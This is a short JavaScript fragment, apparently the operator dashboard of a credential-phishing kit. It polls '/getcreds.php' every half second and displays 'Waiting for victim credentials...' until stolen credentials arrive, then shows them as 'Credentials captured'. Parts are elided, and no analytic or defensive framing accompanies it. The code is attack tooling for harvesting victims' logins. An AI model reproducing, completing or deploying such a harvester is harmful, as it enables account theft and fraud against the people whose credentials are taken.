        ...
        if(ajax.readyState === 4) {
            if(ajax.status === 200 || ajax.status === 0) {
                if (ajax.responseText == "") {
                    ...
                    document.getElementById('message').innerText = "Waiting for victim credentials...";
                    document.body.style.background = '#00407b';
                } else {
                    // Victim IP captured. Display!
                    document.getElementById('message').innerText = "Credentials captured: " + ajax.responseText;
 ...
 */
function beginSync() {
    setInterval("sync('/getcreds.php')", 500);
}
